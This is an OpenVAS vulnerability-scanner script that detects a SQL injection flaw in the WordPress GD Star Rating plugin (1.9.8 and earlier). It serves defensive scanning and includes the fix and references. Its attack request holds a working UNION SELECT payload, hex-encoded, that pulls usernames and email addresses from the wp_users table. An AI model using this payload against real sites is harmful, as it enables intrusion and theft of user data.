###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_wordpress_gd_star_rating_plugin_sql_inj_vuln.nasl 3108 2016-04-19 06:58:41Z benallard $
#
# WordPress GD Star Rating Plugin 'votes' Parameter SQL Injection Vulnerability
#
# Authors:
# Sooraj KS <kssooraj@secpod.com>
#
# Copyright:
# Copyright (c) 2011 Greenbone Networks GmbH, http://www.greenbone.net
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_solution = "Upgrade to GD Star Rating Plugin version 1.9.9,
For updates refer to http://wordpress.org/extend/plugins/gd-star-rating/

*****
NOTE: Exploit will work when nonce is disabled, by default it will be enabled.
*****";

tag_impact = "Successful exploitation will allow attacker to cause SQL Injection
attack and gain sensitive information.

Impact Level: Application";

tag_affected = "WordPress GD Star Rating Plugin version 1.9.8 and prior.";

tag_insight = "The flaw is caused by improper validation of user-supplied input
passed via the 'votes' parameter to /wp-content/plugins/gd-star-rating/ajax.php,
which allows attacker to manipulate SQL queries by injecting arbitrary SQL code.";

tag_summary = "This host is running WordPress GD Star Rating Plugin and is prone
to SQL injection vulnerability.";

SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.802204";
CPE = "cpe:/a:wordpress:wordpress";

if(description)
{
  script_oid(SCRIPT_OID);
  script_version("$Revision: 3108 $");
  script_tag(name:"last_modification", value:"$Date: 2016-04-19 08:58:41 +0200 (Tue, 19 Apr 2016) $");
  script_tag(name:"creation_date", value:"2011-06-13 15:28:04 +0200 (Mon, 13 Jun 2011)");
  script_bugtraq_id(48166);
  script_tag(name:"cvss_base", value:"7.5");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
  script_name("WordPress GD Star Rating Plugin 'votes' Parameter SQL Injection Vulnerability");

  script_xref(name : "URL" , value : "http://packetstormsecurity.org/files/view/102095/wpstarrating-sql.txt");
  script_xref(name : "URL" , value : "http://downloads.securityfocus.com/vulnerabilities/exploits/48166.txt");

  script_tag(name:"qod_type", value:"remote_vul");
  script_summary("Check if WordPress GD Star Rating plugin is vulnerable to SQL Injection");
  script_category(ACT_ATTACK);
  script_copyright("Copyright (C) 2011 Greenbone Networks GmbH");
  script_family("Web application abuses");
  script_dependencies("secpod_wordpress_detect_900182.nasl");
  script_require_ports("Services/www", 80);
  script_require_keys("wordpress/installed");
  script_tag(name : "impact" , value : tag_impact);
  script_tag(name : "affected" , value : tag_affected);
  script_tag(name : "insight" , value : tag_insight);
  script_tag(name : "summary" , value : tag_summary);
  script_tag(name : "solution" , value : tag_solution);
  exit(0);
}


include("http_func.inc");
include("version_func.inc");
include("http_keepalive.inc");
include("host_details.inc");


## Get HTTP Port
if(!port = get_app_port(cpe:CPE, nvt:SCRIPT_OID))exit(0);

## Check Host Supports PHP
if(!can_host_php(port:port)){
  exit(0);
}

## Get WordPress Location
if(!dir = get_app_location(cpe:CPE, nvt:SCRIPT_OID, port:port))exit(0);

## Construct attack request
url = string(dir,"/wp-content/plugins/gd-star-rating/ajax.php?vote_type=cache",
             "&vote_domain=a&votes=asr.1.xxx.1.2.5+limit+0+union+select+1,",
             "0x535242,1,1,concat(0x613a313a7b733a363a226e6f726d616c223b733a3",
             "23030303a22,substring(concat((select+concat(0x6f70656e564153,",
             "0x3a,user_nicename,0x3a,user_email,0x3a,user_login,0x3a,0x6f706",
             "56e564153)+from+wp_users+where+length(user_pass)>0+order+by+id+",
             "limit+0,1),repeat(0x20,2000)),1,2000),0x223b7d),1,1,1+limit+1");

## Try SQL injection and check the response to confirm vulnerability
if(http_vuln_check(port:port, url:url, check_header: TRUE,
   pattern:">openVAS:(.+):(.+):(.+):openVAS")) {
  security_message(port);
}
